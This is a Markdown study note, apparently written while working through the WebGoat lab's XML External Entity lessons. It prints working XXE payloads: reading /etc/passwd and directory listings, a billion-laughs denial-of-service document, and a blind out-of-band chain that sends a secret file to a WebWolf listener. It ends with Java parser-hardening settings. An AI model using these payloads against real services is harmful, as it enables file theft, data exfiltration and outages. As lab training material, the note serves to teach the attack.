<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [A4 - XML External Entities](#a4---xml-external-entities)
  - [XXE](#xxe)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# A4 - XML External Entities

## XXE

### 1. Concept

### 2. What is a XML entity?

Types of XXE attacks:

- classic: an external entity is included in a local DTD
- blind: no output or errors are shown in the response
- error: resource get in the error message

### 3. XXE example

XML entities:

```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE author [
	<!ELEMENT author (#PCDATA)>
	<!ENTITY js "Jo Smith">
]>
<author>&js;</author>
```

External DTD declaration:

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "email.dtd">
<email>
	<to>webgoat@webgoat.org</to>
	<from>webwolf@webwolf.org</from>
	<subject>Your app is great, but contains flaws</subject>
	<body>Hi, your application contains some SQL injections</body>
</email>
```

with `email.dtd` content:

```
<!ELEMENT email (to,from,title,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT subject (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

XXE:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE author [
	<!ENTITY js SYSTEM "file:///etc/passwd">		
]>
<author>&js;</author>
```

Hint: including the `DOCTYPE` definition 
if the parser settings are enabled to allow external entities to be processed 
you are off to a good start for finding a XXE injection.

### 4. Let's try

Exploit:

```xml
<?xml version="1.0"?>
<!DOCTYPE author [
	<!ENTITY js SYSTEM "file:///">
]>
<comment>  <text>&js;</text></comment>
```

### 5. Assignment solution

### 6. Find XXE with a code review

- Jackson 2.7.8 does not inizialize the parser safely
- Spring Boot framework initializes the parser safely

### 7. Modern REST framework

Exploit:

HTTP Header: `Content-Type
	application/xml`

HTTP Body:

```xml
<?xml version="1.0"?>
<!DOCTYPE author [
	<!ENTITY js SYSTEM "file:///">
]>
<comment>  <text>&js;</text></comment>
```

### 8. Assignment solution

### 9. XXE DoS attack

Exploit example:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
	<!ENTITY lol "lol">
	<!ELEMENT lolz (#PCDATA)>
	<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
	<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
	<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
	<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
	<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
	<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
	<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
	<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
	<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### 10. Blind XXE

- Create and host `attack.dtd` file on WebWolf:

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY send SYSTEM 'http://localhost:9090/landing'>
```

- Submit the following xml in order to invoke the `attack.dtd`

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
	<!ENTITY % remote SYSTEM "http://localhost:9090/files/newbie/attack.dtd">
	%remote;
]>
<comment>
  <text>&send;</text>
</comment>
```

- Check 'WebWolf' > 'Incoming requests'

### 11. Blind XXE assignment

In DTD:

- `% declared_variable`
- `%invoked_variable;`

In XML:

- `&invoked_variable;`

N.B.: It is not possible refer to an entity from another entity in the same DOCTYPE.
A possible workaround is to construct the URL with data coming from other entities.

Attack phases:

- the payload loads the remote dtd file (through `%dtd;`)
- the dtd file refers to `file` (`%file;`)
- `file` (defined in the payload) is loaded from the file system
- the payload performs `send` (`&send;`)
- in order to perform `send`, `all` from the dtd file is executed (`%all;`)
- HTTP request is performed

injection.dtd

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:9090/landing?text=%file;'>"> %all;
```

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE author [
	<!ENTITY % file SYSTEM "file:///home/mastinux/.webgoat-8.1.0//XXE/secret.txt">
	<!ENTITY % dtd SYSTEM "http://localhost:9090/files/newbie/injection.dtd">
	%dtd;
]>
<comment>
  <text> &send; </text>
</comment>
```

From 'WebWolf' > 'Incoming Request': `WebGoat 8.0 rocks... (ZWYWLAwxmi)`

### 12. XXE mitigation

- ignore DTD:

```java
XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

- if unable to ignore DTD, ignore external entities:

```java
XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, true);
```